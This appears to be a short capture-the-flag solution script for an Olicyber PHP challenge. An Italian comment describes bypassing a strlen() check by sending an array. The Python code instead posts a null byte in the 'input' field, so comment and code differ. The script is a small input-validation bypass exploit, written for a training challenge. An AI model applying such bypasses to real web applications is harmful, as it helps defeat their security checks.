#basta cambiare tipo di variabile a tag html input che prende il PHP, se gli passi un Array lo strlen() restituisce 0 e quindi possiamo passare il primo controllo e poi passare quello che vogliamo alla stringa

import requests

data = {"input": '\0'}

r = requests.post("http://soundofsilence.challs.olicyber.it/", data = data)

print(r.status_code)
print(r.text)